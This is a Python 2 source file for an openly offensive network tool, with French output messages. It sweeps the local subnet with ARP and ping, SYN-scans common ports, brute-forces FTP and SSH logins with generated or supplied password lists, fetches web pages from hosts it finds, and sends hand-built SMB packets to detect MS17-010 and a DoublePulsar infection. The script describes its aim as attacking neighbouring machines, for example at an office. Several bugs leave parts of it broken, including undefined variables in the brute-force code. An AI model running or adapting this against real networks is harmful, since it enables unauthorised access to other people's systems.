#!/usr/bin/env python2
#-*- coding:utf-8 -*-

__author__='''
[Cs133]
Twitter: @133_cesium
'''
__description__='''
The aim of this is to discover who is online in the neightborhood of the same LAN (at the office for example...)
And if some known ports are open and in listenning mode, we try to access them the hard way. :)
That simple.

Steps:
------
1st: ARP check on LAN/24
2nd: Discovering sequence (Hostname for example, if shared) and port scan
3rd: Attacking attempts by BF

Version 3:
----------
MS17-010 detection now embedded.
Many thanks to https://github.com/worawit/MS17-010.
'''
__license__='''
<+> Under the terms of the GPL v3 License.
'''


import scapy.route, scapy.config, scapy.layers.l2
import sys, math, errno, socket, logging, requests, struct
from ftplib import FTP
from scapy.all import *
from random import randint
from threading import Thread
from argparse import ArgumentParser
from paramiko import SSHClient, AutoAddPolicy
from string import digits, ascii_lowercase, uppercase, hexdigits, letters, punctuation

known_ports 	= [21,22,2222,25,80,443,445,8080,8000]
letters_digits  = digits + letters
all		= digits + letters + punctuation
online  	= {}
ips_o,pwd	= [],[]
SYNACK  	= 0x12
flag,ftop	= 0,0
bf_ok		= False
buffersize	= 1024

logging.basicConfig(format='%(asctime)s %(levelname)-5s %(message)s',
			datefmt='%Y-%m-%d %H:%M:%S',
			level=logging.DEBUG)
logger = logging.getLogger(__name__)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


# BF part ==========================================================================================
def print_fmt(sentence):
	lgth = len(sentence)
	print sentence + '\n' + '-'*(lgth-10)

def pwd_alpha(lgr, mode):
	if mode == 'lower':
		return ''.join(ascii_lowercase[randint(0,len(ascii_lowercase)-1)] for i in range(int(lgr)))
	elif mode == 'upper':
		return ''.join(uppercase[randint(0,len(uppercase)-1)] for i in range(int(lgr)))
	elif mode == 'digits':
		return ''.join(digits[randint(0,len(digits)-1)] for i in range(int(lgr)))
	elif mode == 'hex':
		return ''.join(hexdigits[randint(0,len(hexdigits)-1)] for i in range(int(lgr)))
	elif mode == 'all':
		return ''.join(all[randint(0,len(all)-1)] for i in range(int(lgr)))
	else:
		return ''.join(letters_digits[randint(0,len(letters_digits)-1)] for i in range(int(lgr)))

def generate(mode, lgr):
	stop = False
	if mode == 'lower':
		len_mode = pow(len(ascii_lowercase), int(lgr))
	elif mode == 'upper':
		len_mode = pow(len(uppercase), int(lgr))
	elif mode == 'digits':
		len_mode = pow(len(digits), int(lgr))
	elif mode == 'hex':
		len_mode = pow(len(hexdigits), int(lgr))
	elif mode == 'all':
		len_mode = pow(len(all), int(lgr))
	else:
		len_mode = pow(len(lc_digits), int(lgr))
	try:
		while stop != True:
			psswd = pwd_alpha(lgr, mode)
			if psswd not in pwd: pwd.append(psswd)
			sys.stdout.write('\r\033[96m[+]\033[0m Remplissage du dictionnaire [/!\\ en mémoire] : ' +
					 str(len(pwd)) + ' / '+ str(len_mode))
			sys.stdout.flush()
			if len(pwd) == len_mode:
				stop = True
				sys.stdout.write('\n\033[94m[+]\033[0m Dictionnaire généré en totalité.\n')
	except KeyboardInterrupt:
		sys.stdout.write('\n\033[94m[+]\033[0m Génération interrompue avec succès. Longueur : %d.\n\n' % len(pwd))
		return pwd
	return pwd

def detonate(log, addr, psswd, essai):
	global ftop
	trig = FTP(addr)
	try:
		sys.stdout.write('\r\033[96m[*]\033[0m Essai nb*' + str(essai) + ' : ' + psswd)
		sys.stdout.flush()
		ret = trig.login(user=log,passwd=psswd)
		trig.quit()
		if "successful" in ret:
			ftop = 1
			sys.stdout.write('\n\n\033[91m[+]\033[0m FTP YEAH : ' + addr + ' --> ' + psswd + '\n\n')
	except:
		trig.close()

def ssh_conn(log, addr, passwd, essai, port):
	global flag
	try:
		client = SSHClient()
		client.set_missing_host_key_policy(AutoAddPolicy())
		sys.stdout.write('\r\033[96m[*]\033[0m Essai nb*' + str(essai) + ' : ' + passwd)
		sys.stdout.flush()
		client.connect(addr,
			username=log,
			password=psswd,
			timeout=10,
			port= port,
			look_for_keys=False)
		print '\n\n\033[91m[+]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
		flag = 1
	except:
		pass

# HTTP / HTTPS part ==============================================================================
def query(port, dst):
	if port == 443:
		url = 'https://{}'.format(dst)
	else:
		url = 'http://{}:{}'.format(dst, port)
	cooki	= {'spip_session':pwd_alpha(16, 'alpha')}
	token	= {'token':pwd_alpha(16, 'alpha')}
	headers = {'content-type':'application/json'}
	r = requests.get(url, headers=headers, verify=False)
	logger.info("\033[92m[*]\033[0m {}: \033[91m{}\033[0m".format(dst, r.status_code))
	return r.text.encode('utf-8')

# SMB part =======================================================================================
def generate_smb_proto_payload(*protos):
	hexdata = []
	for proto in protos:
		hexdata.extend(proto)
	return "".join(hexdata)

def calculate_doublepulsar_xor_key(s):
	"""Calculate Doublepulsar Xor Key
	"""
	x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
	x = x & 0xffffffff  # this line was added just to truncate to 32 bits
	return x

def negotiate_proto_request():
	"""Generate a negotiate_proto_request packet.
	"""
	logger.debug("Generate negotiate request")
	netbios = [
			'\x00',				# 'Message_Type'
		   	'\x00\x00\x54']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42',		# 'server_component': .SMB
			'\x72',				# 'smb_command': Negotiate Protocol
			'\x00\x00\x00\x00',		# 'nt_status'
			'\x18',				# 'flags'
			'\x01\x28',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			'\x00\x00',			# 'tree_id'
			'\x2F\x4B',			# 'process_id'
			'\x00\x00',			# 'user_id'
			'\xC5\x5E']			# 'multiplex_id'
	negotiate_proto_request = [
			'\x00',				# 'word_count'
			'\x31\x00',			# 'byte_count'
			# Requested Dialects
			'\x02',				# 'dialet_buffer_format'
			'\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00',   # 'dialet_name': LANMAN1.0
			'\x02',				# 'dialet_buffer_format'
			'\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00',   # 'dialet_name': LM1.2X002
			'\x02',				# 'dialet_buffer_format'
			'\x4E\x54\x20\x4C\x41\x4E\x4D\x41\x4E\x20\x31\x2E\x30\x00',  # 'dialet_name3': NT LANMAN 1.0
			'\x02',				# 'dialet_buffer_format'
			'\x4E\x54\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00']   # 'dialet_name4': NT LM 0.12
	return generate_smb_proto_payload(netbios, smb_header, negotiate_proto_request)

def session_setup_andx_request():
	"""Generate session setuo andx request.
	"""
	logger.debug("Generate session setup andx request")
	netbios = [
			'\x00',				# 'Message_Type'
			'\x00\x00\x63']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42', 		# 'server_component': .SMB
			'\x73',				# 'smb_command': Session Setup AndX
			'\x00\x00\x00\x00', 		# 'nt_status'
			'\x18',				# 'flags'
			'\x01\x20',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			'\x00\x00',			# 'tree_id'
			'\x2F\x4B',			# 'process_id'
			'\x00\x00',			# 'user_id'
			'\xC5\x5E']			# 'multiplex_id'
	session_setup_andx_request = [
			'\x0D',				# Word Count
			'\xFF',				# AndXCommand: No further command
			'\x00',				# Reserved
			'\x00\x00',			# AndXOffset
			'\xDF\xFF',			# Max Buffer
			'\x02\x00',			# Max Mpx Count
			'\x01\x00',			# VC Number
			'\x00\x00\x00\x00', 		# Session Key
			'\x00\x00',			# ANSI Password Length
			'\x00\x00',			# Unicode Password Length
			'\x00\x00\x00\x00', 		# Reserved
			'\x40\x00\x00\x00', 		# Capabilities
			'\x26\x00',			# Byte Count
			'\x00',				# Account
			'\x2e\x00',			# Primary Domain
			'\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00',		# Native OS: Windows 2000 2195
			'\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00']			# Native OS: Windows 2000 5.0
	return generate_smb_proto_payload(netbios, smb_header, session_setup_andx_request)

def tree_connect_andx_request(ip,userid):
	"""Generate tree connect andx request.
	"""
	logger.debug("Generate tree connect andx request")
	netbios = [
			'\x00',				# 'Message_Type'
			'\x00\x00\x47']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42', 		# 'server_component': .SMB
			'\x75',				# 'smb_command': Tree Connect AndX
			'\x00\x00\x00\x00', 		# 'nt_status'
			'\x18',				# 'flags'
			'\x01\x20',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			'\x00\x00',			# 'tree_id'
			'\x2F\x4B',			# 'process_id'
			userid,				# 'user_id'
			'\xC5\x5E']			# 'multiplex_id'
	ipc = "\\\\{}\IPC$\x00".format(ip)
	logger.debug("Connecting to {} with UID = {}".format(ipc, struct.unpack('>H', userid)))
	tree_connect_andx_request = [
			'\x04',				# Word Count
			'\xFF',				# AndXCommand: No further commands
			'\x00',				# Reserved
			'\x00\x00',			# AndXOffset
			'\x00\x00',			# Flags
			'\x01\x00',			# Password Length
			'\x1A\x00',			# Byte Count
			'\x00',				# Password
			ipc.encode(),			# \\xxx.xxx.xxx.xxx\IPC$
			'\x3f\x3f\x3f\x3f\x3f\x00']   	# Service
	length = len("".join(smb_header)) + len("".join(tree_connect_andx_request))
	netbios[1] = struct.pack(">L", length)[-3:]
	return generate_smb_proto_payload(netbios, smb_header, tree_connect_andx_request)

def peeknamedpipe_request(treeid, processid, userid, multiplex_id):
	"""Generate tran2 request
	"""
	logger.debug("Generate peeknamedpipe request")
	netbios = [
			'\x00',				# 'Message_Type'
			'\x00\x00\x4a']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42', 		# 'server_component': .SMB
			'\x25',				# 'smb_command': Trans2
			'\x00\x00\x00\x00', 		# 'nt_status'
			'\x18',				# 'flags'
			'\x01\x28',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			treeid,
			processid,
			userid,
			multiplex_id]
	tran_request = [
			'\x10',				# Word Count
			'\x00\x00',			# Total Parameter Count
			'\x00\x00',			# Total Data Count
			'\xff\xff',			# Max Parameter Count
			'\xff\xff',			# Max Data Count
			'\x00',				# Max Setup Count
			'\x00',				# Reserved
			'\x00\x00',			# Flags
			'\x00\x00\x00\x00', 		# Timeout: Return immediately
			'\x00\x00',			# Reversed
			'\x00\x00',			# Parameter Count
			'\x4a\x00',			# Parameter Offset
			'\x00\x00',			# Data Count
			'\x4a\x00',			# Data Offset
			'\x02',				# Setup Count
			'\x00',				# Reversed
			'\x23\x00',			# SMB Pipe Protocol: Function: PeekNamedPipe (0x0023)
			'\x00\x00',			# SMB Pipe Protocol: FID
			'\x07\x00',
			'\x5c\x50\x49\x50\x45\x5c\x00'] # \PIPE\
	return generate_smb_proto_payload(netbios, smb_header, tran_request)

def trans2_request(treeid, processid, userid, multiplex_id):
	"""Generate trans2 request.
	"""
	logger.debug("Generate tran2 request")
	netbios = [
			'\x00',				# 'Message_Type'
			'\x00\x00\x4f']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42', 		# 'server_component': .SMB
			'\x32',				# 'smb_command': Trans2
			'\x00\x00\x00\x00', 		# 'nt_status'
			'\x18',				# 'flags'
			'\x07\xc0',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			treeid,
			processid,
			userid,
			multiplex_id]
	trans2_request = [
			'\x0f',				# Word Count
			'\x0c\x00',			# Total Parameter Count
			'\x00\x00',			# Total Data Count
			'\x01\x00',			# Max Parameter Count
			'\x00\x00',			# Max Data Count
			'\x00',				# Max Setup Count
			'\x00',				# Reserved
			'\x00\x00',			# Flags
			'\xa6\xd9\xa4\x00', 		# Timeout: 3 hours, 3.622 seconds
			'\x00\x00',			# Reversed
			'\x0c\x00',			# Parameter Count
			'\x42\x00',			# Parameter Offset
			'\x00\x00',			# Data Count
			'\x4e\x00',			# Data Offset
			'\x01',				# Setup Count
			'\x00',				# Reserved
			'\x0e\x00',			# subcommand: SESSION_SETUP
			'\x00\x00',			# Byte Count
			'\x0c\x00' + '\x00' * 12]
	return generate_smb_proto_payload(netbios, smb_header, trans2_request)

# https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/
# https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_ms17_010
# https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb
# https://www.symantec.com/security_response/vulnerability.jsp?bid=96707
# https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/[MS-SMB2]-151016.pdf
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa365233(v=vs.85).aspx
# https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
# https://community.rapid7.com/community/metasploit/blog/2017/04/03/introducing-rubysmb-the-protocol-library-nobody-else-wanted-to-write
# https://msdn.microsoft.com/en-us/library/ee441741.aspx
# https://github.com/countercept/doublepulsar-detection-script/blob/master/detect_doublepulsar_smb.py
# http://stackoverflow.com/questions/38735421/packing-an-integer-number-to-3-bytes-in-python
# https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
# https://github.com/worawit/MS17-010/blob/master/BUG.txt

def conn(host):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.settimeout(5)
	client.connect((host, 445))
	return client

'''
SMB_HEADER architecture:
	"server_component : 04x"
	"smb_command      : 01x"
	"error_class      : 01x"
	"reserved1        : 01x"
	"error_code       : 02x"
	"flags            : 01x"
	"flags2           : 02x"
	"process_id_high  : 02x"
	"signature        : 08x"
	"reserved2        : 02x"
	"tree_id          : 02x"
	"process_id       : 02x"
	"user_id          : 02x"
	"multiplex_id     : 02x"
'''

def smb_handler(client, payload):
	client.send(payload)
	tcp_response = client.recv(buffersize)
	arch_smb = {
			'netbios'	:	tcp_response[:4],
			'response'	:	tcp_response[36:]
	}
	arch_smb['smb_header'] = { 	# smb_header : 32 bytes
			'server_component'	:	tcp_response[4:8],
			'smb_command'		:	tcp_response[8:9],
			'error_class'		:	tcp_response[9:10],
			'reserved1'		:	tcp_response[10:11],
			'error_code'		:	tcp_response[11:13],
			'flags'			:	tcp_response[13:14],
			'flags2'		:	tcp_response[14:16],
			'process_id_high' 	:	tcp_response[16:18],
			'signature'		:	tcp_response[18:26],
			'reserved2'		:	tcp_response[26:28],
			'tree_id'		:	tcp_response[28:30],
			'process_id'		:	tcp_response[30:32],
			'user_id'		:	tcp_response[32:34],
			'multiplex_id'		:	tcp_response[34:36]
	}
	return arch_smb

# Network scan part ==============================================================================
def long2net(arg):
	if (arg <= 0 or arg >= 0xFFFFFFFF):
		raise ValueError("\033[91m[-]\033[0m Valeur du masque illégale.", hex(arg))
	return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))

def to_CIDR_notation(bytes_network, bytes_netmask):
	network = scapy.utils.ltoa(bytes_network)
	netmask = long2net(bytes_netmask)
	net = "%s/%s" % (network, netmask)
	if netmask < 16:
		logger.warn("\033[91m[-]\033[0m %s est trop gros." % net)
		return None
	return net

def scan_and_print_neighbors(net, interface, timeout=1):
	global ips_o
	print_fmt("\033[94m[+]\033[0m ARP %s sur %s" % (net, interface))
	try:
		ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
		for s, r in ans.res:
			line = r.sprintf("%Ether.src%  %ARP.psrc%")
			ips_o.append(line.split(' ')[2])
			try:
				hostname = socket.gethostbyaddr(r.psrc)
				line += " " + hostname[0]
			except socket.herror:
				pass
			except KeyboardInterrupt:
				print '\033[91m[-]\033[0m L\'utilisateur a choisi l\'interruption du process.'
				break
			logger.info("\033[96m[+]\033[0m " + line)
	except socket.error as e:
		if e.errno == errno.EPERM:
			logger.error("\033[91m[-]\033[0m %s. Vous n'etes pas root?", e.strerror)
		else:
			raise

def local_network_scan():
	for network, netmask, _, interface, address in scapy.config.conf.route.routes:
		if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
			continue
		if netmask <= 0 or netmask == 0xFFFFFFFF:
			continue
		net = to_CIDR_notation(network, netmask)
		if interface != scapy.config.conf.iface:
			logger.warn("\033[92m[*]\033[0m Ignore %s car Scapy ne supporte pas ce type d'interface.", net)
			continue
		if net:
			scan_and_print_neighbors(net, interface)

def checkhost(ip):
	global ips_o
	conf.verb = 0
	try:
		ping, no = sr(IP(dst=ip)/ICMP(), timeout=1.5, retry=-2)
		if ping.res:
			logger.info("\033[96m[+]\033[0m La cible est en ligne : " + ip)
			ips_o.append(ip)
	except socket.error as e:
		if e.errno == errno.EPERM:
			logger.error("\033[91m[-]\033[0m %s. Vous n'etes pas root?", e.strerror)
		else:
			pass
	except Exception as e:
		logger.error("\033[91m[-]\033[0m %s.", e.strerror)
		pass

def network_scan(ip):
	mask 	  = [255,255,255,0]
	ipf 	  = ip.split('.')
	pre 	  = [str(int(ipf[i]) & mask[i]) for i in range(len(ipf))]
	ip_reseau = pre[0] + '.' + pre[1] + '.' + pre [2] + '.'
	relicat   = 255 - int(pre[3])
	all_hosts = relicat if relicat != 255 else 255
	return [ip_reseau + str(suffixe) for suffixe in range(int(pre[3]),all_hosts,1)]

# Nmap part ==========================================================================================
def scanner(target):
	global online, bf_ok
	ports_i = []
	for port in known_ports:
		try:
			srcport = randint(20000,40000)
			conf.verb = 0
			SYNACKpkt = sr1(IP(dst = target)/TCP(sport = srcport, dport = port, flags = "S"), timeout=2)
			pktflags = SYNACKpkt.getlayer(TCP).flags
			if pktflags == SYNACK:
				logger.info('\033[96m[+]\033[0m Port Ouvert : \033[33m{}\033[0m sur la cible --> {}'.format(port, target))
				ports_i.append(port)
			else:
				RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
				send(RSTpkt)
			online[target] = ports_i
			if ports_i == 22 or ports_i == 2222 or ports_i == 21:
				bf_ok = True
		except KeyboardInterrupt:
			RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
			send(RSTpkt)
			print "\n\033[92m[*]\033[0m La requete s'est stoppée sur demande utilisateur."
		except Exception as e:
			#logger.error("\033[91m[-]\033[0m {}: {}".format(e, target))
			pass

def port_scan(ip):
	global ips_o, online
	all_hosts = []
	try:
		if ip == get_ip():
			print_fmt('\n\033[92m[*]\033[0m Scan du réseau local:')
			local_network_scan()
			if not ips_o:
				sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
		else:
			print '\n\033[92m[*]\033[0m Scan du réseau distant:'
			all_hosts = network_scan(ip)
			threads = []
			for host in all_hosts:
				proc = Thread(target=checkhost,args=(host,))
				threads.append(proc)
				proc.start()
			for thr in threads:
				thr.join()
		if ips_o:
			print_fmt('\n\033[92m[*]\033[0m Scan de port sur les machines ARPées:')
			threads = []
			for ip in ips_o:
				proc = Thread(target=scanner,args=(ip,))
				threads.append(proc)
				proc.start()
			for thr in threads:
				thr.join()
		else:
			sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
		print_fmt('\n\033[92m[*]\033[0m Résumé du scan de ports:')
		print online
	except KeyboardInterrupt:
		logger.info('\n\033[93m[*]\033[0m Interruption utilisateur.')
		sys.exit(-1)
	except Exception as e:
		logger.error('\n\033[92m[-]\033[0m Erreur port_scan({}): \033[31m{}\033[0m'.format(ip, e))

def get_ip():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect(("8.8.8.8",80))
		ret = s.getsockname()[0]
		s.close()
		return ret
	except:
		sys.exit('\033[91m[-]\033[0m Déconnecté du réseau?\n')

# Arguments handler part ===============================================================================
def get_args():
	args = ArgumentParser(version='3.3',description='Discovery and attack only, made by Cesium133.')
	args.add_argument('-b','--bruteforce',
		action='store_true',
		default=False,
		help='Argument optionnel pour déclencher le mode attaque.')
	args.add_argument('-i','--ip',
		action='store',
		nargs=1,
		help='Machine cible.')
	args.add_argument('-w','--wordlist',
		action='store',
		nargs=1,
		help='Ajout d\'un dictionnaire.')
	args.add_argument('-u','--username',
		action='store',
		nargs=1,
		default=['admin'],
		help='Username distant à BF.')
	args.add_argument('-m','--mode',
		action='store',
		nargs=1,
		default=['lower'],
		help='Alphabet de bruteforce [lower | upper | digits | letters+digits | hex | all].')
	args.add_argument('-l','--longueur',
		action='store',
		nargs=1,
		default=['3'],
		help='Longueur des mots de passe souhaitée.')
	return args.parse_args()


# Entry point ==========================================================================================
if __name__ == '__main__':
	args = get_args()
	ip = get_ip() if args.ip is None else args.ip[0]
	logger.info('\033[93m[IP]\033[0m {}'.format(ip))
#
#	from multiprocessing import Pool
#	with open(args.wordlist[0],'r') as dico:
#		pool = Pool(4)
#		pool.map(detonate,dico,4)
#
	ips = network_scan(ip)
	port_scan(ip)

	if args.bruteforce and bf_ok:
		user = args.username[0]
		logger.info('\033[93m[USER]\033[0m {}'.format(user))
		if args.wordlist is not None:
			try:
				print_fmt("\033[94m[+]\033[0m Prise en compte de la wordlist: " + args.wordlist[0])
				with open(args.wordlist[0],'rb') as wl:
					dic = wl.read().replace('\r','').split('\n')
			except:
				print '\033[91m[-]\033[0m une erreur est survenue: Ouverture de la wordlist.'
				sys.exit(-1)
		else:
			print_fmt("\033[94m[+]\033[0m Generation du dictionnaire.")
			print "\n\033[92m[*]\033[0m Mode:", args.mode[0]
			print "\033[92m[*]\033[0m Longueur des lignes:", args.longueur[0]
			print "\033[92m[*]\033[0m Pour interrompre le processus et poursuivre les tests -> [CTRL+C]\n"
			dic = generate(args.mode[0], args.longueur[0])
	elif args.bruteforce:
		print '\n\033[94m[~]\033[0m Pas de ports à bruteforcer [21/22/2222].'

	print_fmt('\n\033[92m[*]\033[0m Phase de capture/reconnaissance brutale:')

	if online is not None:
		for host in online:
# FTP ----------------------------------------------------------------------------------------------------------
			if args.bruteforce and bf_ok:
				idx = 0
				if 21 in online[host]:
					print "\n\033[33m[FTP]\033[0m Cible avec FTP ouvert : %s." % host
					try:
						threads = []
						for item in dic:
							t = Thread(target=detonate,args=(user,ip,item,idx,))
							threads.append(t)
							t.start()
							idx += 1
							if len(threads) >= 10:
								for thr in threads:
									thr.join()
								threads = []
							if ftop == 1:
								ftop = 0
								break
					except KeyboardInterrupt:
						print '\n[*] Nbr d\'essais '+ str(idx)
						idx = 0
					except Exception as e:
						logger.error("\033[91m[-]\033[0m BF FTP.")
				idx = 0
# SSH ----------------------------------------------------------------------------------------------------------
				if 22 in online[host] or 2222 in online[host]:
					port_idx = [x for i,x in enumerate(online[host]) if x == 22 or x == 2222]
					print "\n\033[31m[SSH]\033[0m Cible avec SSH ouvert : %s sur %d." % (host, online[host][port_idx[0]])
					try:
						threads = []
						for psswd in dic:
							conn = Thread(target=ssh_conn,args=(user,addr,psswd,idx,online[host][port_idx[0]],))
							threads.append(t)
							conn.start()
							idx += 1
							if len(threads) >= 10:
								for thr in threads:
									thr.join()
								threads = []
							if flag == 1:
								flag = 0
								break
					except KeyboardInterrupt:
						print '\n\n[*] Nbr d\'essais '+ str(idx)
						idx = 0
					except Exception as e:
						logger.error("\033[91m[-]\033[0m BF SSH")
# HTTP ---------------------------------------------------------------------------------------------------------
			if 80 in online[host] or 8000 in online[host] or 8080 in online[host]:
				port_idx = [x for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
				print "\n\033[35m[HTTP]\033[0m Getting page -> Cible avec HTTP ouvert : {} sur le port {}.".format(host, port_idx[0])
				for item in port_idx:
					page = query(item, host)
					with open('HTTP-' + host + '-page.html','w') as f:
						f.write(page)
# HTTPS --------------------------------------------------------------------------------------------------------
			if 443 in online[host]:
				print "\n\033[1m[HTTPS]\033[0m Sniffing -> Cible avec HTTPS ouvert : %s." % host
				page = query(443, host)
				with open('HTTPS-' + host + '-page.html','w') as f:
					f.write(page)
# SMB [Vérifie si le poste est vulnérable à MS17-010] ----------------------------------------------------------
			if 445 in online[host]:
				print "\n\033[36m[SMB/CIFS]\033[0m Vuln MS17-010 -> Cible avec SMB ouvert : %s." % host
				native_os = 'OS-NOTFOUND'
				try:
					# Connexion
					smb_client = conn(host)
					# P1: negotiate_proto_request
					payload 	 = negotiate_proto_request()
					smb_response = smb_handler(smb_client, payload)
					# P2: session_setup_andx_request
					payload 	 = session_setup_andx_request()
					smb_response = smb_handler(smb_client, payload)
					# P3: tree_connect_andx_request
					userid 		 = smb_response['smb_header']['user_id']
					native_os 	 = smb_response['response'][9:].split('\x00')[0]
					payload 	 = tree_connect_andx_request(host, userid)
					smb_response = smb_handler(smb_client, payload)
					# P4: peeknamedpipe_request
					treeid 		 = smb_response['smb_header']['tree_id']
					processid 	 = smb_response['smb_header']['process_id']
					userid 		 = smb_response['smb_header']['user_id']
					multiplex_id 	 = smb_response['smb_header']['multiplex_id']
					payload 	 = peeknamedpipe_request(treeid, processid, userid, multiplex_id)
					smb_response = smb_handler(smb_client, payload)
					# Cible vulnérable ?
#
#					nt_status = smb.error_class, smb.reserved1, smb.error_code
#					0xC0000205 - STATUS_INSUFF_SERVER_RESOURCES - vulnerable
#					0xC0000008 - STATUS_INVALID_HANDLE
#					0xC0000022 - STATUS_ACCESS_DENIED
#
					nt_status = smb_response['smb_header']['error_class'] + \
								smb_response['smb_header']['reserved1'] + \
								smb_response['smb_header']['error_code']
					if nt_status == '\x05\x02\x00\xc0':
						logger.info("\033[33m[_]\033[0m [{}] semble être VULNERABLE à MS17-010! (\033[33m{}\033[0m)".format(host, native_os))
						# P5: trans2_request
						payload 	 = trans2_request(treeid, processid, userid, multiplex_id)
						smb_response = smb_handler(smb_client, payload)
						signature	 = smb_response['smb_header']['signature']
						multiplex_id = smb_response['smb_header']['multiplex_id']
						if multiplex_id == '\x00\x51' or multiplex_id == '\x51\x00':
							key = calculate_doublepulsar_xor_key(signature)
							logger.info("\033[33m[_]\033[0m Le poste est INFECTE par DoublePulsar! - XOR Key: {}".format(key))
					elif nt_status in ('\x08\x00\x00\xc0', '\x22\x00\x00\xc0'):
						logger.info("\033[92m[+]\033[0m [{}] ne semble PAS vulnérable! (\033[33m{}\033[0m)".format(ip, native_os))
					else:
						logger.info('\033[93m[~]\033[0m Non détecté! (\033[33m{}\033[0m)'.format(native_os))
				except socket.error as e:
					logger.error("\n\033[91m[-]\033[0m Socket error: {} (\033[33m{}\033[0m)".format(e, native_os))
				except Exception as e:
					logger.error("\n\033[91m[-]\033[0m Undefined error: {} (\033[33m{}\033[0m)".format(e, native_os))
		sys.exit('\n\033[91m[+]\033[0m # Job done #\n')
	else:
		sys.exit('\033[91m[-]\033[0m Afin de poursuivre l\'analyse, vous devez mentionner un mode (wordlist / mode de bf).')
